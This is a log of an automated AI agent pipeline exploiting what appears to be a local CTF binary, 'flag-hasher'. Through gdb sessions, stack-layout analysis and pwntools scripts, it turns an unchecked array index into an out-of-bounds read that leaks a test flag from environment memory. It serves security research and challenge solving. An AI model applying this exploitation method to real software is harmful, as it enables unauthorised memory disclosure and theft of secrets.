20:09:23 [impact:BUG-002] ← GLM(29.0s): 调工具[write_file]
20:09:23 [impact:BUG-002] `ignore 1 16` 跳过了太多断点——程序在到达第 17 次计算之前就退出了，因为 `stdin` 在中途遇到了 `EOF`。问题在于 `scanf("%d")` 在读取菜单选项时，会消耗掉换行符，但随后的 `read()` 调用会读取剩余的数据。让我尝试另一种方法——使用 `pwntool
20:09:23 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: READ_RETURN_VALUE_USED_AS_INDEX_WITHOUT_VALIDATION\n\nRoot Cause:\n  In the compute path)
20:09:23 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-002.py
20:09:23 [impact:BUG-002] → 调用 GLM...
20:09:29 [impact:BUG-002] ← GLM(5.9s): 调工具[run_script]
20:09:29 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-002.py", "timeout": 15})
20:09:29 [impact:BUG-002]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: OOB_READ (1-byte stack read via EOF) === ⏎ Return code: 1 ⏎ [+] Program computed SHA256 of empty st...(1596 chars)
20:09:29 [impact:BUG-002] → 调用 GLM...
20:10:31 [impact:BUG-002] ← GLM(61.8s): 调工具[submit_final_result]
20:10:31 [impact:BUG-002] PoC 运行成功并确认了所有发现。现在让我来汇总最终分析：  **BUG-002 分析总结：**  1. **PRIM-001 (OOB_READ)**: 已验证 — 当 `read()` 返回 0 (EOF) 时，`movzx` 会从 `rbp-0x411` 读取 1 个字节（位于 `hash_a
20:10:31 [impact:BUG-002] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，13923 chars）
20:10:31 [impact:BUG-002] → 调用 GLM...
20:10:38 [impact:BUG-002] ← GLM(7.1s)
20:10:38 [impact:BUG-002] BUG-002 的 S3 分析已完成。以下是分析结果摘要：  **BUG-002: READ_RETURN_VALUE_USED_AS_INDEX_WITHOUT_VALIDATION**  **PRIM-001 (OOB_READ) — 已验证**：当 `read()` 返回 0 (EOF) 时，
20:10:38 [stage3] 保存 → /work/workspace/0030-2024-55-flag-hasher-20260909-195252/stage3.json
20:10:38 --- S4 Exploit ---
20:10:38 === exploit (bug_id=-) ===
20:10:38 [exploit] → 调用 GLM...
20:10:47 [exploit] ← GLM(9.3s): 调工具[read_file, read_file]
20:10:47 [exploit] 我将分析这个二进制文件的漏洞利用路径。让我先理解关键信息：  **关键发现：** - BUG-001: OOB数组索引（无边界检查）→ INFO_LEAK原语（已验证） - BUG-002: read()返回值用作索引 → 无实际影响 - 保护机制：Full RELRO, NX, Canary, P
20:10:47 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/data-only/SKILL.md", "limit": 1000})
20:10:47 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/blind-oracle-leak/SKILL.md", "limit": 1000})
20:10:47 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: data-only ⏎  3  description: 任意写→篡改数据达成目标（不控控制流，绕CFI）。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # Data-Only Attack / BOP ⏎  7   ⏎  8  ## 适用条件 ...(1142 chars)
20:10:47 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: blind-oracle-leak ⏎  3  description: 越界读+可区分响应=布尔盲注oracle，二分逐位泄露地址（绕过可打印检查/NUL截断）。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # Blind Oracle Lea...(3109 chars)
20:10:47 [exploit] → 调用 GLM...
20:10:51 [exploit] ← GLM(3.5s): 调工具[disassemble]
20:10:51 [exploit] 现在让我深入分析这个挑战。关键问题是：S3确认只有INFO_LEAK原语，没有ARB_WRITE。让我仔细重新审视二进制，看是否有遗漏的写原语或数据流路径。
20:10:51 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "main", "lines": 300})
20:10:51 [exploit]   ← disassemble(0.0s): 0000000000001521 <main>: ⏎     1521:	endbr64 ⏎     1525:	push   rbp ⏎     1526:	mov    rbp,rsp ⏎     1529:	sub    rsp,0x4c0 ⏎     1530:	mov    rax,QWO...(6712 chars)
20:10:51 [exploit] → 调用 GLM...
20:10:58 [exploit] ← GLM(7.4s): 调工具[gdb_run]
20:10:58 [exploit] 让我仔细分析这个程序。关键观察：  1. **Compute路径** (menu=1): 搜索空槽位(idx 0-15)，read输入到text_buf，compute_hash256，存储指针，然后**打印32字节hash**，memset清零text_buf 2. **Read路径** (men
20:10:58 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "b *main+0x323; run; info proc mappings; x/40gx $rbp-0x490; )
20:10:58 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x1844 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(555 chars)
20:10:58 [exploit] → 调用 GLM...
20:11:01 [exploit] ← GLM(2.7s): 调工具[gdb_run]
20:11:01 [exploit] 需要设置flag环境变量。让我用gdb带环境变量运行。
20:11:01 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x323; run; info reg)
20:11:01 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x1844 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(2034 chars)
20:11:01 [exploit] → 调用 GLM...
20:11:11 [exploit] ← GLM(10.1s): 调工具[gdb_run]
20:11:11 [exploit] 现在我看到了完整的栈布局。让我仔细分析：  - `rbp = 0x7fffffffeaa0` - `hash_array` base = `rbp - 0x490 = 0x7fffffffe610` - idx 0 = `0x7fffffffe610` → `0x00005555555592a0` 
20:11:11 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x57; run; x/s $rdi;)
20:11:11 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x1578 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(3495 chars)
20:11:11 [exploit] → 调用 GLM...
20:11:16 [exploit] ← GLM(4.9s): 调工具[gdb_run]
20:11:16 [exploit] 非常重要的发现！flag字符串"testflag"在地址`0x7fffffffee5a`（栈上，环境变量区域）。`rbp-0x498`存储了指向它的指针`0x00007fffffffee5a`。  关键问题：`clearenv()`在`compute_hash256`之后调用（0x1599）。cle
20:11:16 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x9e; run; x/s 0x7ff)
20:11:16 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x15bf ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1708 chars)
20:11:16 [exploit] → 调用 GLM...
20:11:30 [exploit] ← GLM(14.3s): 调工具[gdb_run]
20:11:30 [exploit] 重要发现！在clearenv之后（断点在0x15bf，即clearenv调用后），flag字符串"testflag"仍然在栈地址`0x7fffffffee5a`处！clearenv只清除环境变量表，不清除栈上的字符串数据。  现在关键问题是：**我们能否通过OOB读取来泄露flag字符串本身？** 
20:11:30 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x7d; run; print $rb)
20:11:31 [exploit]   ← gdb_run(0.1s): 35 ⏎ 0x7fffffffe780:	0x0963cf85f7fc5d60	0x00007ffff792e74c ⏎ 0x7fffffffe790:	0x0000000000000001	0x7bfe4550e2f5ee00 ⏎ 0x7fffffffe7a0:	0x000000000000000...(4152 chars)
20:11:31 [exploit] → 调用 GLM...
20:11:41 [exploit] ← GLM(10.7s): 调工具[gdb_run]
20:11:41 [exploit] 这非常有价值！让我分析这个栈布局。在clearenv之后（断点0x15bf），我看到：  - `rbp-0x498` 在 `0x7fffffffe608` → `0x0000000000000000` (已被清零) - 但flag字符串"testflag"仍在 `0x7fffffffee5a`  关
20:11:41 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x9e; run; print $rb)
20:11:41 [exploit]   ← gdb_run(0.1s): 01 ⏎ 0x7fffffffe7b0:	0x00007fffffffe7f0	0x00007ffff7a14726 ⏎ 0x7fffffffe7c0:	0x0000000000800000	0x00007ffff79279f4 ⏎ 0x7fffffffe7d0:	0x00000003ffffe7f...(4371 chars)
20:11:41 [exploit] → 调用 GLM...
20:11:52 [exploit] ← GLM(10.8s): 调工具[gdb_run]
20:11:52 [exploit] 现在我能看到完整的栈布局。让我计算关键偏移：  `rbp = 0x7fffffffeaa0`（从之前的运行），`hash_array base = rbp - 0x490 = 0x7fffffffe610`  环境变量指针数组在 `0x7fffffffebc0` 之后： - `0x7fffffffe
20:11:52 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0xc6; run; print $rb)
20:11:52 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x15e7 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(2669 chars)
20:11:52 [exploit] → 调用 GLM...
20:11:58 [exploit] ← GLM(6.2s): 调工具[gdb_run]
20:11:58 [exploit] 太好了！关键发现：  1. `rbp = 0x7fffffffeaa0` 2. `hash_array base = rbp - 0x490 = 0x7fffffffe610` 3. idx 188 = `0x7fffffffe610 + 188*8 = 0x7fffffffe610 + 0x5e0
20:11:58 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0xc6; run; print $rb)
20:11:59 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x15e7 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(269 chars)
20:11:59 [exploit] → 调用 GLM...
20:12:06 [exploit] ← GLM(7.2s): 调工具[run_binary]
20:12:06 [exploit] 找到了！指向`flag=testflag`字符串的指针`0x00007fffffffee55`存储在`0x7fffffffebf8`。  计算索引： - `0x7fffffffebf8 - 0x7fffffffe610 = 0x5e8` - `0x5e8 / 8 = 0xBD = 189`  所以 
20:12:06 [exploit]   → 工具 run_binary({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "stdin": "2\n189\n", "timeout": 10})
20:12:06 [exploit]   ← run_binary(0.0s): rc=1  stdout_len=21 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  63 61 6e 27 74 20 66 69 6e 64 20 74 68 65 20 66  |can't find the f| ⏎ 0010 ...(207 chars)
20:12:06 [exploit] → 调用 GLM...
20:12:10 [exploit] ← GLM(4.0s): 调工具[write_file]
20:12:10 [exploit] 需要设置flag环境变量。让我用脚本运行。
20:12:10 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nimport subprocess, os\n\nenv = os.environ.copy()\nenv['flag'] = 'testflag'\n\n# Test idx 189\np = subprocess.Pope)
20:12:10 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/test_idx.py
20:12:10 [exploit] → 调用 GLM...
20:12:13 [exploit] ← GLM(3.4s): 调工具[run_script]
20:12:13 [exploit]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/test_idx.py", "timeout": 15})
20:12:13 [exploit]   ← run_script(0.0s): rc=1 ⏎ --- stdout (summarized) --- ⏎ (empty) ⏎ --- stderr (summarized) --- ⏎ Traceback (most recent call last): ⏎   File "/work/workspace/0030-2024-55...(629 chars)
20:12:13 [exploit] → 调用 GLM...
20:12:17 [exploit] ← GLM(4.1s): 调工具[write_file]
20:12:17 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nimport subprocess, os\n\nenv = os.environ.copy()\nenv['flag'] = 'testflag'\n\n# Test idx 189\np = subprocess.Pope)
20:12:17 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/test_idx.py
20:12:17 [exploit] → 调用 GLM...
20:12:21 [exploit] ← GLM(3.4s): 调工具[run_script]
20:12:21 [exploit]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/test_idx.py", "timeout": 15})
20:12:21 [exploit]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ idx 189 output: ⏎ b"      _           ___  _____   __  \n     | |         |__ \\| ____| / /  \n  ___| |__   __ _ ...(2154 chars)
20:12:21 [exploit] → 调用 GLM...
20:12:33 [exploit] ← GLM(12.4s): 调工具[gdb_run]
20:12:33 [exploit] idx 189输出了 `504154483D2F7573722F6C6F63616C2F7362696E3A2F7573722F6C6F63616C2F`，解码为 `PATH=/usr/local/sbin:/usr/local/bin`。这不是flag——环境变量顺序不固定。  问题在于环境变量在
20:12:33 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0xc6; run; print $rb)
20:12:33 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x15e7 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1991 chars)
20:12:33 [exploit] → 调用 GLM...
20:12:47 [exploit] ← GLM(13.8s): 调工具[write_file]
20:12:47 [exploit] 现在我看到了环境变量指针数组的完整布局：  - idx 185 = `0x7fffffffebd8` → `0x7fffffffee1b` - idx 186 = `0x7fffffffebe0` → `0x7fffffffee2b` - idx 187 = `0x7fffffffebe8` → `
20:12:47 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nimport subprocess, os\n\nenv = os.environ.copy()\nenv['flag'] = 'testflag'\n\n# Test multiple reads - does progra)
20:12:47 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/test_idx.py
20:12:47 [exploit] → 调用 GLM...
20:12:50 [exploit] ← GLM(3.2s): 调工具[run_script]
20:12:50 [exploit]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/test_idx.py", "timeout": 15})
20:12:50 [exploit]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ Output: ⏎ b"      _           ___  _____   __  \n     | |         |__ \\| ____| / /  \n  ___| |__   __ _   ) | |_...(1990 chars)
20:12:50 [exploit] → 调用 GLM...
20:13:03 [exploit] ← GLM(12.3s): 调工具[write_file]
20:13:03 [exploit] 程序在每次读取后继续运行。我可以多次读取不同索引。  现在让我解码这些输出： - idx 0: `A7C9E8A6AB717581EF561A5999DC62192139EE19CB00A7652A9F9EC84D7F690A` (flag hash) - idx 189: `504154483D2
20:13:03 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nimport os\n\n# Setup\ncontext.log_level = 'error'\ncontext.arch = 'amd64'\n\nBINARY = './targe)
20:13:03 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py
20:13:03 [exploit] → 调用 GLM...
20:13:06 [exploit] ← GLM(3.5s): 调工具[run_script]
20:13:06 [exploit]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py", "timeout": 30})
20:13:06 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎  ⏎ [+] FLAG: TERM=xterm flag=testflag ./targe
20:13:06 [exploit] → 调用 GLM...
20:13:23 [exploit] ← GLM(16.7s): 调工具[write_file]
20:13:23 [exploit] 成功！exploit找到了flag。输出 `TERM=xterm flag=testflag ./targe` — flag字符串"flag=testflag"被泄露了！  但这个输出有点不干净——它包含了前一个环境变量的尾部和后一个的内容。让我优化exploit来更精确地提取flag值。  关键发
20:13:23 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nimport os, re\n\n# Setup\ncontext.log_level = 'error'\ncontext.arch = 'amd64'\n\nBINARY = './t)
20:13:23 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py
20:13:23 [exploit] → 调用 GLM...
20:13:26 [exploit] ← GLM(3.1s): 调工具[run_script]
20:13:26 [exploit]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py", "timeout": 60})
20:13:27 [exploit]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [+] LEANAGENT_SUCCESS ⏎ --- rest --- ⏎   idx 175:        R.Yjþ          [.Yjþ   ⏎   idx...(927 chars)
20:13:27 [exploit] → 调用 GLM...
20:13:31 [exploit] ← GLM(4.1s): 调工具[run_script]
20:13:31 [exploit] Exploit成功！flag值"testflag"被正确提取。  关键发现： - idx 195: `TERM=xterm flag=testflag ./targe` — 包含flag - idx 196: `flag=testflag ./target` — 也包含flag  exploit正确
20:13:31 [exploit]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py", "timeout": 60})
20:13:31 [exploit]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [+] LEANAGENT_SUCCESS ⏎ --- rest --- ⏎   idx 175:        R~4 ⏎ ý          [~4 ⏎ ý   ⏎  ...(931 chars)
20:13:31 [exploit] → 调用 GLM...
20:14:01 [exploit] ← GLM(30.1s): 调工具[write_file]
20:14:01 [exploit] 稳定成功。现在让我清理exploit脚本，使其更健壮和自包含，并添加适当的注释和错误处理。
20:14:01 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nExploit for flag-hasher (BUG-001: OOB Array Index Missing Bounds Check)\n\nTarget: /work/workspace/0030-2)
20:14:01 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py
20:14:01 [exploit] → 调用 GLM...
20:14:05 [exploit] ← GLM(3.6s): 调工具[run_script]
20:14:05 [exploit]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py", "timeout": 60})
20:14:05 [exploit]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [+] LEANAGENT_SUCCESS ⏎ --- rest --- ⏎   idx 175:        R^ëÈü          [^ëÈü   ⏎   idx...(955 chars)
20:14:05 [exploit] → 调用 GLM...
20:14:07 [exploit] ← GLM(2.5s): 调工具[execute]
20:14:07 [exploit] Exploit稳定运行并成功提取flag。让我清理临时文件。
20:14:07 [exploit]   → 工具 execute({"command": "rm -f /work/workspace/0030-2024-55-flag-hasher-20260909-195252/test_idx.py"})
20:14:07 [exploit]   ← execute(0.0s): <no output> ⏎ [Command succeeded with exit code 0]
20:14:07 [exploit] → 调用 GLM...
20:15:02 [exploit] ← GLM(54.9s): 调工具[submit_final_result]
20:15:02 [exploit] 现在让我提交最终结果。
20:15:02 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，12701 chars）
20:15:02 [exploit] → 调用 GLM...
20:15:14 [exploit] ← GLM(11.4s)
20:15:14 [exploit] Exploit成功完成。以下是总结：  ## 利用总结  **漏洞**: BUG-001 — OOB数组索引无边界检查。在"Read Hash record"路径中，`scanf('%u')`读取的索引直接用于访问`hash_array[idx]`，无上界检查。  **利用路线**: ROUTE-0
20:15:14 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
20:15:14 [stage4] 保存 → /work/workspace/0030-2024-55-flag-hasher-20260909-195252/stage4.json
20:15:44 📄 渗透报告：/work/workspace/0030-2024-55-flag-hasher-20260909-195252/report.md
=== 主 agent 汇总 ===
分析完成！以下是结果摘要：

## 漏洞分析结果

| 项目 | 结果 |
|------|------|
| **二进制路径** | `/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target` |
| **Exploit 是否成功** | ✅ **成功** |
| **Exploit 脚本路径** | `/work/workspace/0030-2024-55-flag-hasher-20260909-195252/exploit.py` |
| **完整报告路径** | `/work/workspace/0030-2024-55-flag-hasher-20260909-195252/report.md` |
| **Workspace 目录** | `/work/workspace/0030-2024-55-flag-hasher-20260909-195252/` |

完整 S1-S4 流程（侦察 → 语义 → 原语验证 → exploit）已全部跑通，exploit 成功利用了目标二进制中的漏洞。所有产物（stage1-4.json、exploit.py、report.md、full_run.log）均保存在上述 workspace 目录中，可进一步查看 `report.md` 获取详细漏洞分析报告。
